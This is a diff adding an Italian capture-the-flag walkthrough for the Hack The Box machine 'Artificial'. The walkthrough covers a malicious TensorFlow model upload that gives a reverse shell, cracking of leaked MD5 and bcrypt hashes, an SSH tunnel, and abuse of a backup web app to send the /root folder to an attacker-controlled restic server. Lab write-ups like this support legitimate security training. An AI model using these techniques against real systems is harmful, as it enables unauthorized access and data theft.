@@ -376,4 +376,132 @@ Eseguendo lo script di privilege escalation sfruttiamo un log world-writable e u
   root@outbound:~# cat root.txt 
   5a82aab4b944ec950***************
 
+#############################################################################
+
+# Machine 'Artificial'
+IP : 10.10.11.74
+
+La macchina espone due porte: SSH e HTTP (che reindirizza verso artificial.htb). 
+Visitando la pagina web si nota la possibilità di effettuare login e registrazione; 
+dopo la registrazione si accede alla dashboard, dove è possibile caricare file.
+
+Un indizio si trova poco sopra l’area di upload: è presente un file scaricabile requirements.txt c
+he indica una versione vulnerabile di TensorFlow: tensorflow-cpu==2.13.1
+
+È presente anche un Dockerfile:
+  FROM python:3.8-slim
+  WORKDIR /code
+  RUN apt-get update && \
+      apt-get install -y curl && \
+      curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
+      rm -rf /var/lib/apt/lists/*
+  RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+  ENTRYPOINT ["/bin/bash"]
+
+Attraverso il Dockerfile possiamo riprodurre l’ambiente utilizzato dalla macchina vulnerabile con le stesse versioni:
+  sudo docker build -t artificial-exploit .
+
+Posizioniamo exploit.py nella cartella dove abbiamo creato l’ambiente Docker e avviamo:
+  sudo docker run -it -v $(pwd):/app artificial-exploit
+
+Entrati nel container Docker, avviamo exploit.py: questo genererà automaticamente il file exploit.m5 da caricare sulla piattaforma.
+
+Una volta generato, lo carichiamo sulla piattaforma e clicchiamo su View Predictions per eseguire l’exploit.
+  └─$ nc -lvnp 9001
+  listening on [any] 9001 ...
+  connect to [10.10.14.99] from (UNKNOWN) [10.10.11.74] 57624
+  /bin/sh: 0: can't access tty; job control turned off
+  $ whoami
+  app
+
+All’interno della cartella instance troviamo un file users.db che apriamo con sqlite3:
+  $ sqlite3 users.db
+  .tables
+  model  user 
+  SELECT * FROM user;
+  1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
+  2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
+  3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
+  4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
+  5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
+
+Gli hash sembrano essere MD5 proviamo a crackarli con CrackStation:
+  c99175974b6e192936d97224638a34f8	md5	mattp005numbertwo
+  0f3d8c76530022670f1c6029eed09ccb	Unknown	Not found.
+  b606c5f5136170f15444251665638b36	Unknown	Not found.
+  bc25b1f80f544c0ab451c02a3dca9fc6	md5	marwinnarak043414036
+  bf041041e57f1aff3be7ea1abd6129d0	Unknown	Not found.
+
+Provando a connetterci in SSH, l’utenza gael risulta valida mentre royer no.
+  gael@artificial:~$ cat user.txt 
+  d71ff9f706b6d3c***************
+
+Navigando ulteriormente (anche con l’aiuto di linpeas) notiamo una potenziale vulnerabilità in /usr/bin/pkexec, 
+che però si rivelerà un falso positivo. Troviamo invece dei backup di una webapp (backrest_backup.tar.gz) 
+che analizzeremo in locale perché non abbiamo i permessi necessari sulla macchina.
+
+Scarichiamo il backup:
+  ─$ scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz ~/Scaricati/
+  gael@artificial.htb's password: 
+  backrest_backup.tar.gz                        100%   50MB 696.8KB/s   01:13    
+                                                                                                                                                              
+in un log troviamo :
+  {"level":"info","ts":1741126673.1804032,"msg":"starting web server 127.0.0.1:9898"}
+
+In un file di configurazione troviamo invece delle credenziali:
+  "users": [
+    {
+      "name": "backrest_root",
+      "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+    }
+
+L’hash è in Base64 decodificandolo otteniamo l’hash bcrypt, che poi crackiamo con John.
+  ──(kali㉿kali)-[~]
+  └─$ john --format=bcrypt bcrypt_hash.txt
+  Almost done: Processing the remaining buffered candidate passwords, if any.
+  Proceeding with wordlist:/usr/share/john/password.lst
+  !@#$%^           (?)  
+
+Notiamo tuttavia che la porta 9898 è accessibile solo internamente; quindi creiamo un tunnel SSH:
+  ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
+
+Ora possiamo collegarci a 127.0.0.1:9898 ed effettuare l’accesso con l’utente trovato in precedenza. 
+Dopo l’accesso è possibile creare repository specificando un URL e una password.
+
+L’idea è sfruttare restic (tool di backup) e rest-server (server per ricevere i backup)
+la macchina target deve eseguire il backup della cartella /root su un server che controlliamo noi.
+
+Avviamo il rest-server : 
+  ./rest-server --path /tmp/restic-data --listen :12345 --no-auth
+
+Sulla macchina target creiamo il repository inserendo Nome del Repo, URL del Repo e password; poi, nella sezione “run command”, eseguiamo:  -r rest:http://10.10.11.98:12345/nomerepo init
+  -r rest:http://10.10.11.98:12345//nomerepo backup /root
+
+Chiudiamo il rest-server e verifichiamo se sono stati creati snapshot:
+  └─$ restic -r /tmp/restic-data/nomerepo snapshots                          
+  enter password for repository: 
+  ID        Time                 Host        Tags        Paths  Size
+  -----------------------------------------------------------------------
+  d3fad4ff  2025-10-09 10:28:06  artificial              /root  4.300 MiB
+  -----------------------------------------------------------------------
+  1 snapshots
+
+Per ripristinare lo snapshot e navigare tar i file: 
+  ┌──(kali㉿kali)-[~/rest-server]
+  └─$ restic -r /tmp/restic-data/nomerepo restore IDREPO --target ./restore
+  enter password for repository: 
+  [0:00] 100.00%  1 / 1 index files loaded
+  restoring snapshot d3fad4ff of [/root] at 2025-10-09 08:28:06.832427586 +0000 UTC by root@artificial to ./restore
+  Summary: Restored 343 files/dirs (4.300 MiB) in 0:00
+
+Il contenuto verrà montato in ./restore; accedendo a /restore/root troviamo il flag:
+  ┌──(kali㉿kali)-[~/rest-server]
+  └─$ cd restore/root 
+                                                                              
+  ┌──(kali㉿kali)-[~/rest-server/restore/root]
+  └─$ cat root.txt             
+  005b9631cfee96*************
+
+
+
 
